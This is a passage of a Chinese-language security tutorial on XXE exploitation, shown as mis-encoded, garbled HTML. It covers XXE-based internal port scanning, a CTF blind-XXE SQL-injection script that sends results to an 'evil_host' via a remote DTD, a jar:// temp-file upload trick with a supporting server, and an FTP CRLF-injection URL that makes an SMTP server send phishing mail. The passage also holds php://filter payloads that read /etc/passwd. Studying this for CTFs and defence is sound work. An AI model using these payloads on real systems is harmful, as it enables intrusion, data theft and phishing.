href="https://xzfile.aliyuncs.com/media/upload/picture/20181120002648-e9a5fb54-ec17-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181120002648-e9a5fb54-ec17-1.png" alt="img"></a></p><h3 id="å®žéªŒå››ï¼šHTTP-å†…ç½‘ä¸»æœºç«¯å£æ‰«æ"><a href="#å®žéªŒå››ï¼šHTTP-å†…ç½‘ä¸»æœºç«¯å£æ‰«æ" class="headerlink" title="å®žéªŒå››ï¼šHTTP å†…ç½‘ä¸»æœºç«¯å£æ‰«æ"></a><strong>å®žéªŒå››ï¼šHTTP å†…ç½‘ä¸»æœºç«¯å£æ‰«æ</strong></h3><p>æ‰¾åˆ°äº†å†…ç½‘çš„ä¸€å°ä¸»æœºï¼Œæƒ³è¦çŸ¥é“æ”»å‡»ç‚¹åœ¨å“ªï¼Œæˆ‘ä»¬è¿˜éœ€è¦è¿›è¡Œç«¯å£æ‰«æï¼Œç«¯å£æ‰«æçš„è„šæœ¬ä¸»æœºæŽ¢æµ‹å‡ ä¹Žæ²¡æœ‰ä»€ä¹ˆå˜åŒ–ï¼Œåªè¦æŠŠip  åœ°å€å›ºå®šï¼Œç„¶åŽå¾ªçŽ¯éåŽ†ç«¯å£å°±è¡Œäº†ï¼Œå½“ç„¶ä¸€èˆ¬æˆ‘ä»¬ç«¯å£æ˜¯é€šè¿‡å“åº”çš„æ—¶é—´çš„é•¿çŸ­åˆ¤æ–­è¯¥è¯¥ç«¯å£æ˜¯å¦å¼€æ”¾çš„ï¼Œè¯»è€…å¯ä»¥è‡ªè¡Œä¿®æ”¹ä¸€ä¸‹ï¼Œå½“ç„¶é™¤äº†è¿™ç§æ–¹æ³•ï¼Œæˆ‘ä»¬è¿˜èƒ½ç»“åˆ burpsuite è¿›è¡Œç«¯å£æŽ¢æµ‹</p><p><strong>æ¯”å¦‚æˆ‘ä»¬ä¼ å…¥ï¼š</strong></p><pre><code>&lt;?xml version="1.0" encoding="utf-8"?&gt;  &lt;!DOCTYPE data SYSTEM "http://127.0.0.1:515/" [  &lt;!ELEMENT data (#PCDATA)&gt;  ]&gt;&lt;data&gt;4&lt;/data&gt;</code></pre><p><strong>è¿”å›žç»“æžœï¼š</strong></p><pre><code>javax.xml.bind.UnmarshalException   - with linked exception:[Exception [EclipseLink-25004] (Eclipse Persistence Services): org.eclipse.persistence.exceptions.XMLMarshalExceptionException Description: An error occurred unmarshalling the document  Internal Exception: â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ: Connection refused</code></pre><p>è¿™æ ·å°±å®Œæˆäº†ä¸€æ¬¡ç«¯å£æŽ¢æµ‹ã€‚å¦‚æžœæƒ³æ›´å¤šï¼Œæˆ‘ä»¬å¯ä»¥å°†è¯·æ±‚çš„ç«¯å£ä½œä¸º å‚æ•° ç„¶åŽåˆ©ç”¨ bp çš„ intruder æ¥å¸®æˆ‘ä»¬æŽ¢æµ‹</p><p><strong>å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</strong></p><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20181120002648-e9dea094-ec17-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181120002648-e9dea094-ec17-1.png" alt="img"></a></p><p>è‡³æ­¤ï¼Œæˆ‘ä»¬å·²ç»æœ‰èƒ½åŠ›å¯¹æ•´ä¸ªç½‘æ®µè¿›è¡Œäº†ä¸€ä¸ªå…¨é¢çš„æŽ¢æµ‹,å¹¶èƒ½å¾—åˆ°å†…ç½‘æœåŠ¡å™¨çš„ä¸€äº›ä¿¡æ¯äº†ï¼Œå¦‚æžœå†…ç½‘çš„æœåŠ¡å™¨æœ‰æ¼æ´žï¼Œå¹¶ä¸”æ°å¥½åˆ©ç”¨æ–¹å¼åœ¨æœåŠ¡å™¨æ”¯æŒçš„åè®®çš„èŒƒå›´å†…çš„è¯ï¼Œæˆ‘ä»¬å°±èƒ½ç›´æŽ¥åˆ©ç”¨ XXE æ‰“å‡»å†…ç½‘æœåŠ¡å™¨ç”šè‡³èƒ½ç›´æŽ¥ getshellï¼ˆæ¯”å¦‚æœ‰äº› å†…ç½‘çš„æœªæŽˆæƒ redis æˆ–è€…æœ‰äº›é€šè¿‡ http get  è¯·æ±‚å°±èƒ½ç›´æŽ¥getshell çš„ æ¯”å¦‚ strus2ï¼‰</p><h3 id="å®žéªŒäº”ï¼šå†…ç½‘ç›²æ³¨-CTF"><a href="#å®žéªŒäº”ï¼šå†…ç½‘ç›²æ³¨-CTF" class="headerlink" title="å®žéªŒäº”ï¼šå†…ç½‘ç›²æ³¨(CTF)"></a><strong>å®žéªŒäº”ï¼šå†…ç½‘ç›²æ³¨(CTF)</strong></h3><p>2018 å¼ºç½‘æ¯ æœ‰ä¸€é“é¢˜å°±æ˜¯åˆ©ç”¨  XXE æ¼æ´žè¿›è¡Œå†…ç½‘çš„ SQL ç›²æ³¨çš„,å¤§è‡´çš„æ€è·¯å¦‚ä¸‹ï¼š</p><p>é¦–å…ˆåœ¨å¤–ç½‘çš„ä¸€å°ipåœ°å€ä¸º 39.107.33.75:33899 çš„è¯„è®ºæ¡†å¤„æµ‹è¯•å‘çŽ° XXE æ¼æ´žï¼Œæˆ‘ä»¬è¾“å…¥ xml ä»¥åŠ dtd ä¼šå‡ºçŽ°æŠ¥é”™</p><p><strong>å¦‚å›¾æ‰€ç¤ºï¼š</strong></p><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20181120002648-ea03a74a-ec17-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181120002648-ea03a74a-ec17-1.png" alt="img"></a></p><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20181120002649-ea345868-ec17-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181120002649-ea345868-ec17-1.png" alt="img"></a></p><p>æ—¢ç„¶å¦‚æ­¤ï¼Œé‚£ä¹ˆæˆ‘ä»¬æ˜¯ä¸æ˜¯èƒ½è¯»å–è¯¥æœåŠ¡å™¨ä¸Šé¢çš„æ–‡ä»¶ï¼Œæˆ‘ä»¬å…ˆè¯»é…ç½®æ–‡ä»¶(è¿™ä¸ªç‚¹æ˜¯ Blind XXE ï¼Œå¿…é¡»ä½¿ç”¨å‚æ•°å®žä½“ï¼Œå¤–éƒ¨å¼•ç”¨ DTD )</p><pre><code>/var/www/52dandan.cc/public_html/config.php</code></pre><p>æ‹¿åˆ°ç¬¬ä¸€éƒ¨åˆ† flag</p><pre><code>&lt;?phpdefine(BASEDIR, "/var/www/52dandan.club/");define(FLAG_SIG, 1);define(SECRETFILE,'/var/www/52dandan.com/public_html/youwillneverknowthisfile_e2cd3614b63ccdcbfe7c8f07376fe431');....?&gt;</code></pre><blockquote><p><strong>æ³¨æ„ï¼š</strong></p><p>è¿™é‡Œæœ‰ä¸€ä¸ªå°æŠ€å·§ï¼Œå½“æˆ‘ä»¬ä½¿ç”¨ libxml è¯»å–æ–‡ä»¶å†…å®¹çš„æ—¶å€™ï¼Œæ–‡ä»¶ä¸èƒ½è¿‡å¤§ï¼Œå¦‚æžœå¤ªå¤§å°±ä¼šæŠ¥é”™ï¼ŒäºŽæ˜¯æˆ‘ä»¬å°±éœ€è¦ä½¿ç”¨ php<br> è¿‡æ»¤å™¨çš„ä¸€ä¸ªåŽ‹ç¼©çš„æ–¹æ³•</p><pre><code>åŽ‹ç¼©ï¼šecho file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd");è§£åŽ‹ï¼šecho file_get_contents("php://filter/read=convert.base64-decode/zlib.inflate/resource=/tmp/1");</code></pre></blockquote><p>ç„¶åŽæˆ‘ä»¬è€ƒè™‘å†…ç½‘æœ‰æ²¡æœ‰ä¸œè¥¿ï¼Œæˆ‘ä»¬è¯»å–</p><pre><code>/proc/net/arp/etc/host</code></pre><p>æ‰¾åˆ°å†…ç½‘çš„å¦ä¸€å°æœåŠ¡å™¨çš„ ip åœ°å€ 192.168.223.18</p><p>æ‹¿åˆ°è¿™ä¸ª ip æˆ‘ä»¬è€ƒè™‘å°±è¦ä½¿ç”¨ XXE è¿›è¡Œç«¯å£æ‰«æäº†ï¼Œç„¶åŽæˆ‘ä»¬å‘çŽ°å¼€æ”¾äº† 80 ç«¯å£ï¼Œç„¶åŽæˆ‘ä»¬å†è¿›è¡Œç›®å½•æ‰«æï¼Œæ‰¾åˆ°ä¸€ä¸ª  test.php  ï¼Œæ ¹æ®æç¤ºï¼Œè¿™ä¸ªé¡µé¢çš„ shop å‚æ•°å­˜åœ¨ä¸€ä¸ªæ³¨å…¥,ä½†æ˜¯å› ä¸ºæœ¬èº«è¿™ä¸ªå°±æ˜¯ä¸€ä¸ª Blind XXE  ,æˆ‘ä»¬çš„å¯¹æœåŠ¡å™¨çš„è¯·æ±‚éƒ½æ˜¯åœ¨æˆ‘ä»¬çš„è¿œç¨‹ DTD ä¸­åŒ…å«çš„ï¼ŒçŽ°åœ¨æˆ‘ä»¬éœ€è¦æ”¹å˜æˆ‘ä»¬çš„è¯·æ±‚ï¼Œé‚£æˆ‘ä»¬å°±è¦åœ¨æ¯ä¸€æ¬¡ä¿®æ”¹è¯·æ±‚çš„æ—¶å€™ä¿®æ”¹æˆ‘ä»¬è¿œç¨‹æœåŠ¡å™¨çš„  DTD æ–‡ä»¶ï¼ŒäºŽæ˜¯æˆ‘ä»¬çš„è„šæœ¬å°±è¦æŒ‚åœ¨æˆ‘ä»¬çš„ VPS ä¸Šï¼Œä¸€è¾¹è¾¹ä¿®æ”¹ DTD ä¸€è¾¹å‘å­˜åœ¨ XXE æ¼æ´žçš„ä¸»æœºå‘é€è¯·æ±‚ï¼Œè„šæœ¬å°±åƒä¸‹é¢è¿™ä¸ªæ ·å­</p><p><strong>ç¤ºä¾‹ä»£ç ï¼š</strong></p><pre><code>import requestsurl = 'http://39.107.33.75:33899/common.php's = requests.Session()result = ''data = {        "name":"evil_man",        "email":"testabcdefg@gmail.com",        "comment":"""&lt;?xml version="1.0" encoding="utf-8"?&gt;                &lt;!DOCTYPE root [                &lt;!ENTITY % dtd SYSTEM "http://evil_host/evil.dtd"&gt;                %dtd;]&gt;                """}for i in range(0,28):        for j in range(48,123):                f = open('./evil.dtd','w')            payload2 = """&lt;!ENTITY % file SYSTEM "php://filter/read=zlib.deflate/convert.base64-encode/resource=http://192.168.223.18/test.php?shop=3'-(case%a0when((select%a0group_concat(total)%a0from%a0albert_shop)like%a0binary('{}'))then(0)else(1)end)-'1"&gt;                &lt;!ENTITY % all "&lt;!ENTITY % send SYSTEM 'http://evil_host/?result=%file;'&gt;"&gt;                %all;                %send;""".format('_'*i+chr(j)+'_'*(27-i))                f.write(payload2)                f.close()                print 'test {}'.format(chr(j))                r = s.post(url,data=data)                if "Oti3a3LeLPdkPkqKF84xs=" in r.content and chr(j)!='_':                        result += chr(j)                        print chr(j)                        breakprint result</code></pre><p>è¿™é“é¢˜éš¾åº¦æ¯”åŠ å¤§ï¼Œåšèµ·æ¥ä¹Ÿéžå¸¸çš„è€—æ—¶ï¼Œæ‰€æœ‰çš„ä¸œè¥¿éƒ½è¦é è„šæœ¬åŽ»çŒœï¼Œå› æ­¤å½“æ—¶æ˜¯0è§£</p><h3 id="å®žéªŒå…­ï¼šæ–‡ä»¶ä¸Šä¼ "><a href="#å®žéªŒå…­ï¼šæ–‡ä»¶ä¸Šä¼ " class="headerlink" title="å®žéªŒå…­ï¼šæ–‡ä»¶ä¸Šä¼ "></a><strong>å®žéªŒå…­ï¼šæ–‡ä»¶ä¸Šä¼ </strong></h3><p>æˆ‘ä»¬ä¹‹å‰è¯´çš„å¥½åƒéƒ½æ˜¯ php ç›¸å…³ï¼Œä½†æ˜¯å®žé™…ä¸ŠçŽ°å®žä¸­å¾ˆå¤šéƒ½æ˜¯ java çš„æ¡†æž¶å‡ºçŽ°çš„ XXE æ¼æ´žï¼Œé€šè¿‡é˜…è¯»æ–‡æ¡£ï¼Œæˆ‘å‘çŽ° Java  ä¸­æœ‰ä¸€ä¸ªæ¯”è¾ƒç¥žå¥‡çš„åè®® jar:// ï¼Œ php  ä¸­çš„ phar:// ä¼¼ä¹Žå°±æ˜¯ä¸ºäº†å®žçŽ° jar:// çš„ç±»ä¼¼çš„åŠŸèƒ½è®¾è®¡å‡ºæ¥çš„ã€‚</p><p><strong>jar:// åè®®çš„æ ¼å¼ï¼š</strong></p><pre><code>jar:{url}!{path}</code></pre><p><strong>å®žä¾‹ï¼š</strong></p><pre><code>jar:http://host/application.jar!/file/within/the/zipè¿™ä¸ª ! åŽé¢å°±æ˜¯å…¶éœ€è¦ä»Žä¸­è§£åŽ‹å‡ºçš„æ–‡ä»¶</code></pre><p>jar èƒ½ä»Žè¿œç¨‹èŽ·å– jar æ–‡ä»¶ï¼Œç„¶åŽå°†å…¶ä¸­çš„å†…å®¹è¿›è¡Œè§£åŽ‹ï¼Œç­‰ç­‰ï¼Œè¿™ä¸ªåŠŸèƒ½ä¼¼ä¹Žæ¯” phar å¼ºå¤§å•Šï¼Œphar://  æ˜¯æ²¡æ³•è¿œç¨‹åŠ è½½æ–‡ä»¶çš„ï¼ˆå› æ­¤ phar://  ä¸€èˆ¬ç”¨äºŽç»•è¿‡æ–‡ä»¶ä¸Šä¼ ï¼Œåœ¨ä¸€äº›2016å¹´çš„HCTFä¸­è€ƒå¯Ÿè¿‡è¿™ä¸ªçŸ¥è¯†ç‚¹ï¼Œæˆ‘ä¹Ÿæ›¾åœ¨æ ¡èµ›ä¸­å‡ºè¿‡ç±»ä¼¼çš„é¢˜ç›®ï¼Œå¥¥ï¼Œ2018å¹´çš„ blackhat è®²è¿°çš„   phar:// çš„ååºåˆ—åŒ–å¾ˆæœ‰è¶£ï¼ŒOrange æ›¾åœ¨2017å¹´çš„ hitcon ä¸­å‡ºè¿‡è¿™é“é¢˜ï¼‰</p><p><strong>jar åè®®å¤„ç†æ–‡ä»¶çš„è¿‡ç¨‹ï¼š</strong></p><p>(1) ä¸‹è½½ jar/zip æ–‡ä»¶åˆ°ä¸´æ—¶æ–‡ä»¶ä¸­<br> (2) æå–å‡ºæˆ‘ä»¬æŒ‡å®šçš„æ–‡ä»¶<br> (3) åˆ é™¤ä¸´æ—¶æ–‡ä»¶</p><blockquote><p><strong>é‚£ä¹ˆæˆ‘ä»¬æ€Žä¹ˆæ‰¾åˆ°æˆ‘ä»¬ä¸‹è½½çš„ä¸´æ—¶æ–‡ä»¶å‘¢ï¼Ÿ</strong></p><p>å› ä¸ºåœ¨ java ä¸­ file:/// åè®®å¯ä»¥èµ·åˆ°åˆ—ç›®å½•çš„ä½œç”¨ï¼Œæ‰€ä»¥æˆ‘ä»¬èƒ½ç”¨ file:/// åè®®é…åˆ jar:// åè®®ä½¿ç”¨</p></blockquote><p>ä¸‹é¢æ˜¯æˆ‘çš„ä¸€äº›æµ‹è¯•è¿‡ç¨‹ï¼š</p><p>æˆ‘é¦–å…ˆåœ¨æœ¬åœ°æ¨¡æ‹Ÿä¸€ä¸ªå­˜åœ¨ XXE çš„ç¨‹åºï¼Œç½‘ä¸Šæ‰¾çš„èƒ½ç›´æŽ¥è§£æž XML æ–‡ä»¶çš„ java æºç </p><p><strong>ç¤ºä¾‹ä»£ç ï¼š</strong></p><p><strong>xml_test.java</strong></p><pre><code>package xml_test;import java.io.File;import javax.xml.parsers.DocumentBuilder;import javax.xml.parsers.DocumentBuilderFactory;import org.w3c.dom.Attr;import org.w3c.dom.Comment;import org.w3c.dom.Document;import org.w3c.dom.Element;import org.w3c.dom.NamedNodeMap;import org.w3c.dom.Node;import org.w3c.dom.NodeList;/** * ä½¿ç”¨é€’å½’è§£æžç»™å®šçš„ä»»æ„ä¸€ä¸ªxmlæ–‡æ¡£å¹¶ä¸”å°†å…¶å†…å®¹è¾“å‡ºåˆ°å‘½ä»¤è¡Œä¸Š * @author zhanglong * */public class xml_test{    public static void main(String[] args) throws Exception    {        DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();        DocumentBuilder db = dbf.newDocumentBuilder();        Document doc = db.parse(new File("student.xml"));        //èŽ·å¾—æ ¹å…ƒç´ ç»“ç‚¹        Element root = doc.getDocumentElement();        parseElement(root);    }    private static void parseElement(Element element)    {        String tagName = element.getNodeName();        NodeList children = element.getChildNodes();        System.out.print("&lt;" + tagName);        //elementå…ƒç´ çš„æ‰€æœ‰å±žæ€§æ‰€æž„æˆçš„NamedNodeMapå¯¹è±¡ï¼Œéœ€è¦å¯¹å…¶è¿›è¡Œåˆ¤æ–­        NamedNodeMap map = element.getAttributes();        //å¦‚æžœè¯¥å…ƒç´ å­˜åœ¨å±žæ€§        if(null != map)        {            for(int i = 0; i &lt; map.getLength(); i++)            {                //èŽ·å¾—è¯¥å…ƒç´ çš„æ¯ä¸€ä¸ªå±žæ€§                Attr attr = (Attr)map.item(i);                String attrName = attr.getName();                String attrValue = attr.getValue();                System.out.print(" " + attrName + "=\"" + attrValue + "\"");            }        }        System.out.print("&gt;");        for(int i = 0; i &lt; children.getLength(); i++)        {            Node node = children.item(i);            //èŽ·å¾—ç»“ç‚¹çš„ç±»åž‹            short nodeType = node.getNodeType();            if(nodeType == Node.ELEMENT_NODE)            {                //æ˜¯å…ƒç´ ï¼Œç»§ç»­é€’å½’                parseElement((Element)node);            }            else if(nodeType == Node.TEXT_NODE)            {                //é€’å½’å‡ºå£                System.out.print(node.getNodeValue());            }            else if(nodeType == Node.COMMENT_NODE)            {                System.out.print("&lt;!--");                Comment comment = (Comment)node;                //æ³¨é‡Šå†…å®¹                String data = comment.getData();                System.out.print(data);                System.out.print("--&gt;");            }        }        System.out.print("&lt;/" + tagName + "&gt;");    }}</code></pre><p>æœ‰äº†è¿™ä¸ªæºç ä»¥åŽï¼Œæˆ‘ä»¬éœ€è¦åœ¨æœ¬åœ°å»ºç«‹ä¸€ä¸ª xml æ–‡ä»¶ ï¼Œæˆ‘å–åä¸º student.xml</p><p><strong>student.xml</strong></p><pre><code>&lt;!DOCTYPE convert [ &lt;!ENTITY  remote SYSTEM "jar:http://localhost:9999/jar.zip!/wm.php"&gt;]&gt;&lt;convert&gt;&amp;remote;&lt;/convert&gt;</code></pre><p><strong>ç›®å½•ç»“æž„å¦‚ä¸‹å›¾ï¼š</strong></p><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20181120002649-ea691684-ec17-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181120002649-ea691684-ec17-1.png" alt="img"></a></p><p>å¯ä»¥æ¸…æ¥šåœ°çœ‹åˆ°æˆ‘çš„è¯·æ±‚æ˜¯å‘è‡ªå·±æœ¬åœ°çš„ 9999 ç«¯å£å‘å‡ºçš„ï¼Œé‚£ä¹ˆ9999 ç«¯å£ä¸Šæœ‰ä»€ä¹ˆæœåŠ¡å‘¢ï¼Ÿå®žé™…ä¸Šæ˜¯æˆ‘è‡ªå·±ç”¨ python å†™çš„ä¸€ä¸ª TCP æœåŠ¡å™¨</p><p><strong>ç¤ºä¾‹ä»£ç ï¼š</strong></p><p><strong>sever.py</strong></p><pre><code>import sys import time import threading import socketserver from urllib.parse import quote import http.client as httpc listen_host = 'localhost' listen_port = 9999 jar_file = sys.argv[1]class JarRequestHandler(socketserver.BaseRequestHandler):      def handle(self):        http_req = b''        print('New connection:',self.client_address)        while b'\r\n\r\n' not in http_req:            try:                http_req += self.request.recv(4096)                print('Client req:\r\n',http_req.decode())                jf = open(jar_file, 'rb')                contents = jf.read()                headers = ('''HTTP/1.0 200 OK\r\n'''                '''Content-Type: application/java-archive\r\n\r\n''')                self.request.sendall(headers.encode('ascii'))                self.request.sendall(contents[:-1])                time.sleep(30)                print(30)                self.request.sendall(contents[-1:])            except Exception as e:                print ("get error at:"+str(e))if __name__ == '__main__':    jarserver = socketserver.TCPServer((listen_host,listen_port), JarRequestHandler)     print ('waiting for connection...')     server_thread = threading.Thread(target=jarserver.serve_forever)     server_thread.daemon = True     server_thread.start()     server_thread.join()</code></pre><p>è¿™ä¸ªæœåŠ¡å™¨çš„ç›®çš„å°±æ˜¯æŽ¥å—å®¢æˆ·ç«¯çš„è¯·æ±‚ï¼Œç„¶åŽå‘å®¢æˆ·ç«¯å‘é€ä¸€ä¸ªæˆ‘ä»¬è¿è¡Œæ—¶å°±ä¼ å…¥çš„å‚æ•°æŒ‡å®šçš„æ–‡ä»¶ï¼Œä½†æ˜¯è¿˜æ²¡å®Œï¼Œå®žé™…ä¸Šæˆ‘åœ¨è¿™é‡ŒåŠ äº†ä¸€ä¸ª sleep(30)ï¼Œè¿™ä¸ªçš„ç›®çš„æˆ‘åŽé¢å†è¯´</p><p>æ—¢ç„¶æ˜¯æ–‡ä»¶ä¸Šä¼ ï¼Œé‚£æˆ‘ä»¬åˆè¦å›žåˆ° jar åè®®è§£æžæ–‡ä»¶çš„è¿‡ç¨‹ä¸­äº†</p><blockquote><p><strong>jar åè®®å¤„ç†æ–‡ä»¶çš„è¿‡ç¨‹ï¼š</strong></p><p>(1) ä¸‹è½½ jar/zip æ–‡ä»¶åˆ°ä¸´æ—¶æ–‡ä»¶ä¸­<br> (2) æå–å‡ºæˆ‘ä»¬æŒ‡å®šçš„æ–‡ä»¶<br> (3) åˆ é™¤ä¸´æ—¶æ–‡ä»¶</p></blockquote><p>é‚£æˆ‘ä»¬æ€Žä¹ˆæ‰¾åˆ°è¿™ä¸ªä¸´æ—¶çš„æ–‡ä»¶å¤¹å‘¢ï¼Ÿä¸ç”¨æƒ³ï¼Œè‚¯å®šæ˜¯é€šè¿‡æŠ¥é”™çš„å½¢å¼å±•çŽ°ï¼Œå¦‚æžœæˆ‘ä»¬è¯·æ±‚çš„</p><pre><code>jar:http://localhost:9999/jar.zip!/1.php</code></pre><p>1.php åœ¨è¿™ä¸ª jar.zip ä¸­æ²¡æœ‰çš„è¯ï¼Œjava è§£æžå™¨å°±ä¼šæŠ¥é”™ï¼Œè¯´åœ¨è¿™ä¸ªä¸´æ—¶æ–‡ä»¶ä¸­æ‰¾ä¸åˆ°è¿™ä¸ªæ–‡ä»¶</p><p><strong>å¦‚ä¸‹å›¾ï¼š</strong></p><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20181120002649-eaa1b2aa-ec17-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181120002649-eaa1b2aa-ec17-1.png" alt="img"></a></p><p>æ—¢ç„¶æ‰¾åˆ°äº†ä¸´æ—¶æ–‡ä»¶çš„è·¯å¾„ï¼Œæˆ‘ä»¬å°±è¦è€ƒè™‘æ€Žä¹ˆä½¿ç”¨è¿™ä¸ªæ–‡ä»¶äº†ï¼ˆæˆ–è€…è¯´æ€Žä¹ˆè®©è¿™ä¸ªæ–‡ä»¶èƒ½æ›´é•¿æ—¶é—´çš„åœç•™åœ¨æˆ‘ä»¬çš„ç³»ç»Ÿä¹‹ä¸­ï¼Œæˆ‘æƒ³åˆ°çš„æ–¹å¼å°±æ˜¯sleep()ï¼‰ä½†æ˜¯è¿˜æœ‰ä¸€ä¸ªé—®é¢˜ï¼Œå› ä¸ºæˆ‘ä»¬è¦åˆ©ç”¨çš„æ—¶å€™è‚¯å®šæ˜¯åœ¨æ–‡ä»¶æ²¡æœ‰å®Œå…¨ä¼ è¾“æˆæžœçš„æ—¶å€™ï¼Œå› æ­¤ä¸ºäº†æ–‡ä»¶çš„å®Œæ•´æ€§ï¼Œæˆ‘è€ƒè™‘åœ¨ä¼ è¾“å‰å°±ä½¿ç”¨ hex ç¼–è¾‘å™¨åœ¨æ–‡ä»¶æœ«å°¾æ·»åŠ åžƒåœ¾å­—ç¬¦ï¼Œè¿™æ ·å°±èƒ½å®Œç¾Žçš„è§£å†³è¿™ä¸ªé—®é¢˜</p><p><strong>ä¸‹é¢æ˜¯æˆ‘çš„å®žéªŒå½•å±ï¼š</strong></p><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20181120002650-eae69596-ec17-1.gif"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181120002650-eae69596-ec17-1.gif" alt="img"></a></p><p>å®žéªŒå°±åˆ°è¿™ä¸€æ­¥äº†ï¼Œæ€Žä¹ˆåˆ©ç”¨å°±çœ‹å„ä½å¤§ä½¬çš„äº†ï¼ˆåç¬‘ï¼‰</p><p>æˆ‘åŽæ¥åœ¨LCTF 2018 å‡ºäº†è¿™æ ·ä¸€ä¸ª CTF é¢˜ç›®ï¼Œè¯¦ç»†çš„ wp å¯ä»¥çœ‹æˆ‘çš„[è¿™ç¯‡æ–‡ç« ](<a href="http://www.k0rz3n.com/2018/11/19/LCTF">http://www.k0rz3n.com/2018/11/19/LCTF</a> 2018 T4lk 1s ch34p,sh0w m3 the sh31l è¯¦ç»†åˆ†æž/)</p><h3 id="å®žéªŒä¸ƒï¼šé’“é±¼ï¼š"><a href="#å®žéªŒä¸ƒï¼šé’“é±¼ï¼š" class="headerlink" title="å®žéªŒä¸ƒï¼šé’“é±¼ï¼š"></a><strong>å®žéªŒä¸ƒï¼šé’“é±¼ï¼š</strong></h3><p>å¦‚æžœå†…ç½‘æœ‰ä¸€å°æ˜“å—æ”»å‡»çš„ SMTP æœåŠ¡å™¨ï¼Œæˆ‘ä»¬å°±èƒ½åˆ©ç”¨  ftp:// åè®®ç»“åˆ CRLF æ³¨å…¥å‘å…¶å‘é€ä»»æ„å‘½ä»¤ï¼Œä¹Ÿå°±æ˜¯å¯ä»¥æŒ‡å®šå…¶å‘é€ä»»æ„é‚®ä»¶ç»™ä»»æ„äººï¼Œè¿™æ ·å°±ä¼ªé€ äº†ä¿¡æ¯æºï¼Œé€ æˆé’“é±¼ï¼ˆä¸€ä¸‹å®žä¾‹æ¥è‡ªfb çš„ä¸€ç¯‡æ–‡ç«  ï¼‰</p><p>Javaæ”¯æŒåœ¨sun.net.ftp.impl.FtpClientä¸­çš„ftp URIã€‚å› æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥æŒ‡å®šç”¨æˆ·åå’Œå¯†ç ï¼Œä¾‹å¦‚<a href="ftp://user:password@host:port/test.txtï¼ŒFTPå®¢æˆ·ç«¯å°†åœ¨è¿žæŽ¥ä¸­å‘é€ç›¸åº”çš„USERå‘½ä»¤ã€‚">ftp://user:password@host:port/test.txtï¼ŒFTPå®¢æˆ·ç«¯å°†åœ¨è¿žæŽ¥ä¸­å‘é€ç›¸åº”çš„USERå‘½ä»¤ã€‚</a></p><p>ä½†æ˜¯å¦‚æžœæˆ‘ä»¬å°†%0D%0A (CRLF)æ·»åŠ åˆ°URLçš„useréƒ¨åˆ†çš„ä»»æ„ä½ç½®ï¼Œæˆ‘ä»¬å°±å¯ä»¥ç»ˆæ­¢USERå‘½ä»¤å¹¶å‘FTPä¼šè¯ä¸­æ³¨å…¥ä¸€ä¸ªæ–°çš„å‘½ä»¤ï¼Œå³å…è®¸æˆ‘ä»¬å‘25ç«¯å£å‘é€ä»»æ„çš„SMTPå‘½ä»¤ï¼š</p><p><strong>ç¤ºä¾‹ä»£ç ï¼š</strong></p><pre><code>ftp://a%0D%0AEHLO%20a%0D%0AMAIL%20FROM%3A%3Csupport%40VULNERABLESYSTEM.com%3E%0D%0ARCPT%20TO%3A%3Cvictim%40gmail.com%3E%0D%0ADATA%0D%0AFrom%3A%20support%40VULNERABLESYSTEM.com%0ATo%3A%20victim%40gmail.com%0ASubject%3A%20test%0A%0Atest!%0A%0D%0A.%0D%0AQUIT%0D%0A:a@VULNERABLESYSTEM.com:25</code></pre><p>å½“FTPå®¢æˆ·ç«¯ä½¿ç”¨æ­¤URLè¿žæŽ¥æ—¶ï¼Œä»¥ä¸‹å‘½ä»¤å°†ä¼šè¢«å‘é€ç»™VULNERABLESYSTEM.comä¸Šçš„é‚®ä»¶æœåŠ¡å™¨ï¼š</p><p><strong>ç¤ºä¾‹ä»£ç ï¼š</strong></p><pre><code>ftp://aEHLO aMAIL FROM: &lt;support@VULNERABLESYSTEM.com&gt;RCPT TO: &lt;victim@gmail.com&gt;DATAFrom: support@VULNERABLESYSTEM.comTo: victim@gmail.comSubject: Reset your passwordWe need to confirm your identity. Confirm your password here: http://PHISHING_URL.com.QUIT:support@VULNERABLESYSTEM.com:25</code></pre><p>è¿™æ„å‘³ç€æ”»å‡»è€…å¯ä»¥ä»Žä»Žå—ä¿¡ä»»çš„æ¥æºå‘é€é’“é±¼é‚®ä»¶ï¼ˆä¾‹å¦‚ï¼šå¸æˆ·é‡ç½®é“¾æŽ¥ï¼‰å¹¶ç»•è¿‡åžƒåœ¾é‚®ä»¶è¿‡æ»¤å™¨çš„æ£€æµ‹ã€‚é™¤äº†é“¾æŽ¥ä¹‹å¤–ï¼Œç”šè‡³æˆ‘ä»¬ä¹Ÿå¯ä»¥å‘é€é™„ä»¶ã€‚</p><h3 id="å®žéªŒå…«ï¼šå…¶ä»–ï¼š"><a href="#å®žéªŒå…«ï¼šå…¶ä»–ï¼š" class="headerlink" title="å®žéªŒå…«ï¼šå…¶ä»–ï¼š"></a><strong>å®žéªŒå…«ï¼šå…¶ä»–ï¼š</strong></h3><p>é™¤äº†ä¸Šé¢å®žéªŒä¸­çš„ä¸€äº›å¸¸è§åˆ©ç”¨ä»¥å¤–è¿˜æœ‰ä¸€äº›ä¸æ˜¯å¾ˆå¸¸ç”¨æˆ–è€…æ¯”è¾ƒé¸¡è‚‹çš„åˆ©ç”¨æ–¹å¼ï¼Œä¸ºäº†å®Œæ•´æ€§æˆ‘åœ¨è¿™ä¸€èŠ‚ç®€å•çš„è¯´ä¸€ä¸‹ï¼š</p><h4 